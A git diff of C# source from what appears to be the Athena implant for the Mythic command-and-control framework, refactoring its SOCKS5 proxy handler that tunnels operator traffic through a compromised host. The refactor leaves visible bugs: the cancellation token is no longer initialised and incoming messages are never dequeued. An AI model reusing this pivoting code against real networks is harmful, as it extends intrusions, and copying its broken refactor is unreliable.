@@ -4,6 +4,7 @@ using Athena.Utilities;
 using Newtonsoft.Json;
 using System;
 using System.Collections.Concurrent;
+using System.Collections.Generic;
 using System.Linq;
 using System.Net.Sockets;
 using System.Threading;
@@ -15,6 +16,8 @@ namespace Athena.Commands.Model
     {
         private CancellationTokenSource ct { get; set; }
         private ConcurrentDictionary<int, ConnectionOptions> connections { get; set; }
+        private ConcurrentBag<SocksMessage> messagesOut = new ConcurrentBag<SocksMessage>();
+        private ConcurrentQueue<SocksMessage> messagesIn = new ConcurrentQueue<SocksMessage>();
         public bool running { get; set; }
         public SocksHandler()
         {
@@ -26,353 +29,348 @@ namespace Athena.Commands.Model
         {
             try
             {
-                this.ct = new CancellationTokenSource();
+                //Read
+                Task.Run(() => { ReadMythicMessages(); });
+                Task.Run(() => { ReadServerMessages(); });
+            }
+            catch
+            {
+                this.Stop();
+                return false;
+            }
+            return true;
+        }
 
-                //Start Reader Task
-                Task.Run(() =>
-                {
-                    while (true)
-                    {
-                        //Check each socket to see if it has something available to read.
-                        Parallel.ForEach(this.connections, connection =>
-                        {
-                            try
-                            {
-                                ReceiveChunk(connection.Value);
-
-                                ////////////////////////////////////////////////////////////////////////////////////////////////
-                                ///Removed this for now because it seems to stop accepting new connections when this is called?
-                                ////////////////////////////////////////////////////////////////////////////////////////////////
-                                //if (!connection.Value.socket.Connected)
-                                //{
-                                //    Console.WriteLine("Socket Disconnected.");
-                                //    SocksMessage smOut = new SocksMessage()
-                                //    {
-                                //        server_id = connection.Value.server_id,
-                                //        data = "",
-                                //        exit = false
-                                //    };
-                                //    Globals.bagOut[connection.Value.server_id] = smOut;
-                                //    while(!this.connections.TryRemove(connection));
-                                //    Console.WriteLine("Removed Connection.");
-                                //}
-
-                            }
-                            catch (Exception e)
-                            {
-                                Console.WriteLine(e.Message);
-                                SocksMessage smOut = new SocksMessage()
-                                {
-                                    server_id = connection.Value.server_id,
-                                    data = "",
-                                    exit = true
-                                };
-                                //Globals.bagOut[connection.Value.server_id] = smOut;
-                                Globals.bagOut.Add(smOut);
-                                while (!this.connections.TryRemove(connection)) ;
-                            }
-                        });
-                    }
-                });
-
-                //Start Sender Task
-                Task.Run(() =>
-                {
-                    //Loop until cancellation is requested.
-                    while (!this.ct.IsCancellationRequested)
-                    {
-                        //Do we have any messages in our queue?
-                        if (Globals.bagIn.Count != 0)
-                        {
-                            /////////////////////////////////////////////////////////////////
-                            //I bet I could parallel foreach this to make it slightly faster.
-                            /////////////////////////////////////////////////////////////////
-                            SocksMessage sm = new SocksMessage();
-
-                            while (!Globals.bagIn.TryTake(out sm)) ;
-
-                            //Console.WriteLine(JsonConvert.SerializeObject(sm));
-                            if (connections.ContainsKey(sm.server_id))
-                            {
-                                //We already know about this connection, so let's just forward the data.
-                                try
-                                {
-                                    //Convert datagram to byte[]
-                                    byte[] datagram = Misc.Base64DecodeToByteArray(sm.data);
-
-                                    //Check datagram
-                                    if (datagram.Length > 0)
-                                    {
-                                        //Get socket object we created previously
-                                        Socket s = this.connections[sm.server_id].socket;
-
-                                        //Forward datagram to endpoint
-                                        s.Send(Misc.Base64DecodeToByteArray(sm.data));
-                                    }
-                                    else
-                                    {
-                                        ////////////////////////////////////////////////////////////////////////////////////////////////
-                                        ///Removed this for now because it seems to stop accepting new connections when this is called?
-                                        ////////////////////////////////////////////////////////////////////////////////////////////////
-
-                                        //We get an empty datagram for a connection we're currently following.
-                                        if (sm.exit)
-                                        {
-                                            //Datagram is an exit packet from Mythic, let's close the connection, dispose of the socket, and remove it from our tracker.
-                                            //if (this.connections.ContainsKey(sm.server_id))
-                                            //{
-                                            //    this.connections[sm.server_id].socket.Disconnect(true);
-                                            //    this.connections[sm.server_id].socket.Close();
-                                            //    this.connections.Take(sm.server_id);
-                                            //}
-
-                                            //Remove from our tracker
-                                            //while (!this.connections.TryRemove(this.connections.Where(kvp => kvp.Value.server_id == sm.server_id).FirstOrDefault())) ;
-                                            //Console.WriteLine("Removed Connection.");
-
-                                            //No reason really to send a response to Mythic
-                                        }
-                                        //Do I need an else for this? What do we do with empty data packets?
-                                    }
-                                }
-                                catch (SocketException e)
-                                {
-                                    //We hit an error, let's figure out what it is.
-                                    Console.WriteLine(e.Message + $"({e.ErrorCode})");
-                                    //Tell mythic that we've closed the connection and that it's time to close it on the client end.
-                                    SocksMessage smOut = new SocksMessage()
-                                    {
-                                        server_id = sm.server_id,
-                                        data = "",
-                                        exit = true
-                                    };
-
-                                    //Add to our messages queue.
-                                    //Globals.bagOut[sm.server_id] = smOut;
-                                    Globals.bagOut.Add(smOut);
-
-                                    //Remove connection from our tracker.
-                                    while (!this.connections.TryRemove(this.connections.Where(kvp => kvp.Value.server_id == sm.server_id).FirstOrDefault())) ;
-                                }
-
-                            }
-                            else
-                            {
-                                //This is the first time we've seen this server_id
-                                //Convert datagram to byte[]
-                                byte[] datagram = Misc.Base64DecodeToByteArray(sm.data);
-
-                                //Check if the datagram is empty.
-                                if (datagram.Length > 0)
-                                {
-                                    //Do we even support this datagram?
-                                    if (datagram[0] != (byte)0x05)
-                                    {
-                                        //Protocol Error, do I need to provide actual information to this?
-                                        ConnectResponse cr = new ConnectResponse()
-                                        {
-                                            status = ConnectResponseStatus.ProtocolError,
-                                            //this need to be localhost
-                                            bndaddr = new byte[] { 0x7F, 0x00, 0x00, 0x01 },
-                                            //this needs to be the bind port
-                                            bndport = new byte[] { 0x50, 0x00 },
-                                            addrtype = 0x01
-                                        };
-
-
-                                        //We've received an unsupported version header
-                                        SocksMessage smOut = new SocksMessage()
-                                        {
-                                            server_id = sm.server_id,
-                                            data = Misc.Base64Encode(cr.ToByte()),
-                                            exit = true
-                                        };
-
-                                        //Send Response
-                                        //Globals.bagOut[sm.server_id] = smOut;
-                                        Globals.bagOut.Add(smOut);
-                                        //Return an unsupported error
-                                    }
-                                    else
-                                    {
-                                        //We do support this datagram, so let's put together out connection object
-                                        ConnectionOptions cn = new ConnectionOptions(datagram, sm.server_id);
-
-
-                                        //TODO SUPPORT FOR BINDING AND UDP STREAMS
-                                        switch (datagram[1])
-                                        {
-                                            case (byte)0x01: //TCP/IP Stream
-                                                //Console.WriteLine("TCP/IP Stream");
-                                                break;
-                                            case (byte)0x02: //TCP/IP Port Bind
-                                                //Console.WriteLine("TCP/IP Bind");
-                                                break;
-                                            case (byte)0x03: //associate UDP Port
-                                                //Console.WriteLine("UDP Port");
-                                                break;
-                                        }
-
-                                        //Did our ConnectionOptions object create properly?
-                                        if (cn.socket != null && cn.endpoint != null)
-                                        {
-                                            try
-                                            {
-                                                //Attempt to connect to the endpoint.
-                                                cn.socket.Connect(cn.endpoint);
-
-                                                //If we made it to here, we've succceeded. Let's let mythic know.
-                                                ConnectResponse cr = new ConnectResponse()
-                                                {
-                                                    status = ConnectResponseStatus.Success,
-                                                    bndaddr = cn.bndBytes,
-                                                    bndport = cn.bndPortBytes,
-                                                    addrtype = cn.addressType
-                                                };
-
-                                                //Shove our SOCKS5 message inside of a mythic message.
-                                                SocksMessage smOut = new SocksMessage()
-                                                {
-                                                    server_id = sm.server_id,
-                                                    data = Misc.Base64Encode(cr.ToByte()),
-                                                    exit = false
-                                                };
-
-                                                //Add to our message queue
-                                                //Globals.bagOut[sm.server_id] = smOut;
-                                                Globals.bagOut.Add(smOut);
-
-                                                //Add the ConnectionsOptions object to our tracker.
-                                                //Mostly only down here to prevent us from having to worry about removing it if something happened with adding it to the MythicOut queue
-                                                while (!this.connections.TryAdd(sm.server_id, cn)) ;
-                                            }
-                                            catch (SocketException e)
-                                            {
-                                                Console.WriteLine(e.Message + $"({e.ErrorCode})");
-                                                //We failed to connect likely. Why though?
-                                                ConnectResponse cr = new ConnectResponse()
-                                                {
-                                                    //this need to be localhost
-                                                    bndaddr = new byte[] { 0x00, 0x00, 0x00, 0x00 },
-                                                    //this needs to be the bind port
-                                                    bndport = new byte[] { 0x00, 0x00 },
-                                                    addrtype = 0x00
-                                                };
-
-                                                //Get error reason.
-                                                switch (e.ErrorCode)
-                                                {
-                                                    case 10065: //Host Unreachable
-                                                        cr.status = ConnectResponseStatus.HostUnreachable;
-                                                        break;
-                                                    case 10047: //Address Family Not Supported
-                                                        cr.status = ConnectResponseStatus.AddressTypeNotSupported;
-                                                        break;
-                                                    case 10061: //Connection Refused
-                                                        cr.status = ConnectResponseStatus.ConnectionRefused;
-                                                        break;
-                                                    case 10051: //Network Unreachable
-                                                        cr.status = ConnectResponseStatus.NetworkUnreachable;
-                                                        break;
-                                                    case 10046: //Protocol Family Not Supported
-                                                        cr.status = ConnectResponseStatus.ProtocolError;
-                                                        break;
-                                                    case 10043: //Protocol Not Supported
-                                                        cr.status = ConnectResponseStatus.ProtocolError;
-                                                        break;
-                                                    case 10042: //Protocol Option
-                                                        cr.status = ConnectResponseStatus.ProtocolError;
-                                                        break;
-                                                    case 10041: //Protocol Type
-                                                        cr.status = ConnectResponseStatus.ProtocolError;
-                                                        break;
-                                                    case 10060: //Timeout
-                                                        cr.status = ConnectResponseStatus.TTLExpired;
-                                                        break;
-                                                    default: //Everything else
-                                                        cr.status = ConnectResponseStatus.GeneralFailure;
-                                                        break;
-                                                }
-
-                                                //Add to SocksMessage
-                                                SocksMessage smOut = new SocksMessage()
-                                                {
-                                                    server_id = sm.server_id,
-                                                    data = Misc.Base64Encode(cr.ToByte()),
-                                                    exit = true
-                                                };
-
-                                                //Put in out queue
-                                                //Globals.bagOut[sm.server_id] = smOut;
-                                                Globals.bagOut.Add(smOut);
-                                            }
-                                        }
-                                        //It did not.
-                                        else
-                                        {
-                                            //Get ready to send socks message indicating reason for CONNECT failure
-                                            ConnectResponse cr = new ConnectResponse()
-                                            {
-                                                //this need to be localhost
-                                                bndaddr = new byte[] { 0x7F, 0x00, 0x00, 0x01 },
-                                                //this needs to be the bind port
-                                                bndport = new byte[] { 0x50, 0x00 },
-                                                addrtype = 0x01
-                                            };
-
-                                            //Couldn't figure out the address family for the request.
-                                            if (cn.addressFamily == AddressFamily.Unknown)
-                                            {
-                                                cr.status = ConnectResponseStatus.AddressTypeNotSupported;
-                                            }
-                                            //Endpoint could not be resolved.
-                                            else if (cn.endpoint is null)
-                                            {
-                                                cr.status = ConnectResponseStatus.HostUnreachable;
-                                            }
-                                            //Something else.
-                                            else
-                                            {
-                                                cr.status = ConnectResponseStatus.GeneralFailure;
-                                            }
-
-                                            //Shove SOCKS CONNECT response into Mythic Response
-                                            SocksMessage smOut = new SocksMessage()
-                                            {
-                                                server_id = sm.server_id,
-                                                data = Misc.Base64Encode(cr.ToByte()),
-                                                exit = false
-                                            };
-
-                                            //Add it to queue, and we're outta here!
-                                            //Globals.bagOut[sm.server_id] = smOut;
-                                            Globals.bagOut.Add(smOut);
-                                        }
-                                    }
-                                }
-                                else
-                                {
-                                    //If we get here, it's both an empty datagram and for a connection we're not currently following.
-                                }
-                            }
-                        }
-                        if (this.ct.IsCancellationRequested)
-                        {
-                            //Cancellation Requested by operator
-                            break;
-                        }
-                    }
-                }, this.ct.Token);
+        public bool Stop()
+        {
+            try
+            {
+                this.running = false;
+                this.ct.Cancel();
                 return true;
             }
             catch
             {
                 return false;
             }
-
         }
 
-        public void ReceiveChunk(ConnectionOptions conn)
+        public List<SocksMessage> getMessages()
+        {
+            List<SocksMessage> messages = this.messagesOut.ToList();
+            this.messagesOut.Clear();
+            messages.Reverse();
+            return messages;
+        }
+
+        public void AddToQueue(SocksMessage message)
+        {
+            this.messagesIn.Enqueue(message);
+        }
+
+        //This function will take messages FROM mythic and forward them to the Server.
+        //Client -> Mythic -> Athena -> Server
+        private void ReadMythicMessages()
+        {
+            while (!this.ct.IsCancellationRequested)
+            {
+                //Get our current list
+                Parallel.ForEach(messagesIn, message =>
+                {
+                    HandleMessage(message);
+                });
+            }
+        }
+
+        //This function will send messages from the Server TO mythic.
+        //Server -> Athena -> Mythic -> Client
+        private void ReadServerMessages()
+        {
+            while (!this.ct.IsCancellationRequested)
+            {
+                Parallel.ForEach(this.connections, connection =>
+                {
+                    if (connection.Value.socket.Available > 0)
+                    {
+                        ReceiveChunk(connection.Value);
+                    }
+                });
+            }
+        }
+
+        private void HandleMessage(SocksMessage sm)
+        {
+            if (this.connections.ContainsKey(sm.server_id))
+            {
+                //We already know about this connection, so let's just forward the data.
+                try
+                {
+                    //Convert datagram to byte[]
+                    byte[] datagram = Misc.Base64DecodeToByteArray(sm.data);
+
+                    //Check datagram
+                    if (datagram.Length > 0)
+                    {
+                        //Get socket object we created previously
+                        Socket s = this.connections[sm.server_id].socket;
+
+                        //Forward datagram to endpoint
+                        s.Send(Misc.Base64DecodeToByteArray(sm.data));
+                    }
+                    else
+                    {
+                        ////////////////////////////////////////////////////////////////////////////////////////////////
+                        ///Removed this for now because it seems to stop accepting new connections when this is called?
+                        ////////////////////////////////////////////////////////////////////////////////////////////////
+
+                        //We get an empty datagram for a connection we're currently following.
+                        if (sm.exit)
+                        {
+                            Console.WriteLine("[ServerID] " + sm.server_id + " exit.");
+                            //Datagram is an exit packet from Mythic, let's close the connection, dispose of the socket, and remove it from our tracker.
+                            //if (this.connections.ContainsKey(sm.server_id))
+                            //{
+                            //    this.connections[sm.server_id].socket.Disconnect(true);
+                            //    this.connections[sm.server_id].socket.Close();
+                            //    this.connections.Take(sm.server_id);
+                            //}
+
+                            //Remove from our tracker
+                            //while (!this.connections.TryRemove(this.connections.Where(kvp => kvp.Value.server_id == sm.server_id).FirstOrDefault())) ;
+                            //Console.WriteLine("Removed Connection.");
+
+                            //No reason really to send a response to Mythic
+                        }
+                        else
+                        {
+                            Console.WriteLine("[EmptyNonExitPacket] Sent by ID: " + sm.server_id);
+                        }
+                        //Do I need an else for this? What do we do with empty data packets?
+                    }
+                }
+                catch (SocketException e)
+                {
+                    //We hit an error, let's figure out what it is.
+                    Console.WriteLine(e.Message + $"({e.ErrorCode})");
+                    //Tell mythic that we've closed the connection and that it's time to close it on the client end.
+                    SocksMessage smOut = new SocksMessage()
+                    {
+                        server_id = sm.server_id,
+                        data = "",
+                        exit = true
+                    };
+
+                    //Add to our messages queue.
+                    //Globals.bagOut[sm.server_id] = smOut;
+                    this.messagesOut.Add(smOut);
+
+                    //Remove connection from our tracker.
+                    while (!this.connections.TryRemove(this.connections.Where(kvp => kvp.Value.server_id == sm.server_id).FirstOrDefault())) ;
+                }
+
+            }
+            else
+            {
+                //This is the first time we've seen this server_id
+                //Convert datagram to byte[]
+                byte[] datagram = Misc.Base64DecodeToByteArray(sm.data);
+
+                //Check if the datagram is empty.
+                if (datagram.Length > 0)
+                {
+                    //Do we even support this datagram?
+                    if (datagram[0] != (byte)0x05)
+                    {
+                        //Protocol Error, do I need to provide actual information to this?
+                        ConnectResponse cr = new ConnectResponse()
+                        {
+                            status = ConnectResponseStatus.ProtocolError,
+                            //this need to be localhost
+                            bndaddr = new byte[] { 0x7F, 0x00, 0x00, 0x01 },
+                            //this needs to be the bind port
+                            bndport = new byte[] { 0x50, 0x00 },
+                            addrtype = 0x01
+                        };
+
+
+                        //We've received an unsupported version header
+                        SocksMessage smOut = new SocksMessage()
+                        {
+                            server_id = sm.server_id,
+                            data = Misc.Base64Encode(cr.ToByte()),
+                            exit = true
+                        };
+
+                        //Send Response
+                        //Globals.bagOut[sm.server_id] = smOut;
+                        this.messagesOut.Add(smOut);
+                        //Return an unsupported error
+                    }
+                    else
+                    {
+                        //We do support this datagram, so let's put together out connection object
+                        ConnectionOptions cn = new ConnectionOptions(datagram, sm.server_id);
+
+
+                        //TODO SUPPORT FOR BINDING AND UDP STREAMS
+                        switch (datagram[1])
+                        {
+                            case (byte)0x01: //TCP/IP Stream
+                                             //Console.WriteLine("TCP/IP Stream");
+                                break;
+                            case (byte)0x02: //TCP/IP Port Bind
+                                             //Console.WriteLine("TCP/IP Bind");
+                                break;
+                            case (byte)0x03: //associate UDP Port
+                                             //Console.WriteLine("UDP Port");
+                                break;
+                        }
+
+                        //Did our ConnectionOptions object create properly?
+                        if (cn.socket != null && cn.endpoint != null)
+                        {
+                            try
+                            {
+                                //Attempt to connect to the endpoint.
+                                cn.socket.Connect(cn.endpoint);
+
+                                //If we made it to here, we've succceeded. Let's let mythic know.
+                                ConnectResponse cr = new ConnectResponse()
+                                {
+                                    status = ConnectResponseStatus.Success,
+                                    bndaddr = cn.bndBytes,
+                                    bndport = cn.bndPortBytes,
+                                    addrtype = cn.addressType
+                                };
+
+                                //Shove our SOCKS5 message inside of a mythic message.
+                                SocksMessage smOut = new SocksMessage()
+                                {
+                                    server_id = sm.server_id,
+                                    data = Misc.Base64Encode(cr.ToByte()),
+                                    exit = false
+                                };
+
+                                //Add to our message queue
+                                //Globals.bagOut[sm.server_id] = smOut;
+                                this.messagesOut.Add(smOut);
+
+                                //Add the ConnectionsOptions object to our tracker.
+                                //Mostly only down here to prevent us from having to worry about removing it if something happened with adding it to the MythicOut queue
+                                while (!this.connections.TryAdd(sm.server_id, cn)) ;
+                            }
+                            catch (SocketException e)
+                            {
+                                Console.WriteLine(e.Message + $"({e.ErrorCode})");
+                                //We failed to connect likely. Why though?
+                                ConnectResponse cr = new ConnectResponse()
+                                {
+                                    //this need to be localhost
+                                    bndaddr = new byte[] { 0x00, 0x00, 0x00, 0x00 },
+                                    //this needs to be the bind port
+                                    bndport = new byte[] { 0x00, 0x00 },
+                                    addrtype = 0x00
+                                };
+
+                                //Get error reason.
+                                switch (e.ErrorCode)
+                                {
+                                    case 10065: //Host Unreachable
+                                        cr.status = ConnectResponseStatus.HostUnreachable;
+                                        break;
+                                    case 10047: //Address Family Not Supported
+                                        cr.status = ConnectResponseStatus.AddressTypeNotSupported;
+                                        break;
+                                    case 10061: //Connection Refused
+                                        cr.status = ConnectResponseStatus.ConnectionRefused;
+                                        break;
+                                    case 10051: //Network Unreachable
+                                        cr.status = ConnectResponseStatus.NetworkUnreachable;
+                                        break;
+                                    case 10046: //Protocol Family Not Supported
+                                        cr.status = ConnectResponseStatus.ProtocolError;
+                                        break;
+                                    case 10043: //Protocol Not Supported
+                                        cr.status = ConnectResponseStatus.ProtocolError;
+                                        break;
+                                    case 10042: //Protocol Option
+                                        cr.status = ConnectResponseStatus.ProtocolError;
+                                        break;
+                                    case 10041: //Protocol Type
+                                        cr.status = ConnectResponseStatus.ProtocolError;
+                                        break;
+                                    case 10060: //Timeout
+                                        cr.status = ConnectResponseStatus.TTLExpired;
+                                        break;
+                                    default: //Everything else
+                                        cr.status = ConnectResponseStatus.GeneralFailure;
+                                        break;
+                                }
+
+                                //Add to SocksMessage
+                                SocksMessage smOut = new SocksMessage()
+                                {
+                                    server_id = sm.server_id,
+                                    data = Misc.Base64Encode(cr.ToByte()),
+                                    exit = true
+                                };
+
+                                //Put in out queue
+                                //Globals.bagOut[sm.server_id] = smOut;
+                                this.messagesOut.Add(smOut);
+                            }
+                        }
+                        //It did not.
+                        else
+                        {
+                            //Get ready to send socks message indicating reason for CONNECT failure
+                            ConnectResponse cr = new ConnectResponse()
+                            {
+                                //this need to be localhost
+                                bndaddr = new byte[] { 0x7F, 0x00, 0x00, 0x01 },
+                                //this needs to be the bind port
+                                bndport = new byte[] { 0x50, 0x00 },
+                                addrtype = 0x01
+                            };
+
+                            //Couldn't figure out the address family for the request.
+                            if (cn.addressFamily == AddressFamily.Unknown)
+                            {
+                                cr.status = ConnectResponseStatus.AddressTypeNotSupported;
+                            }
+                            //Endpoint could not be resolved.
+                            else if (cn.endpoint is null)
+                            {
+                                cr.status = ConnectResponseStatus.HostUnreachable;
+                            }
+                            //Something else.
+                            else
+                            {
+                                cr.status = ConnectResponseStatus.GeneralFailure;
+                            }
+
+                            //Shove SOCKS CONNECT response into Mythic Response
+                            SocksMessage smOut = new SocksMessage()
+                            {
+                                server_id = sm.server_id,
+                                data = Misc.Base64Encode(cr.ToByte()),
+                                exit = false
+                            };
+
+                            //Add it to queue, and we're outta here!
+                            //Globals.bagOut[sm.server_id] = smOut;
+                            this.messagesOut.Add(smOut);
+                        }
+                    }
+                }
+                else
+                {
+                    //If we get here, it's both an empty datagram and for a connection we're not currently following.
+                }
+            }
+            }
+
+        private void ReceiveChunk(ConnectionOptions conn)
         {
             SocksMessage smOut;
             byte[] bytes;
@@ -403,21 +401,9 @@ namespace Athena.Commands.Model
                     data = Misc.Base64Encode(bytes),
                     exit = false
                 };
-                Globals.bagOut.Add(smOut);
+                this.messagesOut.Add(smOut);
             }
         }
-        public bool Stop()
-        {
-            try
-            {
-                this.running = false;
-                this.ct.Cancel();
-                return true;
-            }
-            catch
-            {
-                return false;
-            }
-        }
+       
     }
 }
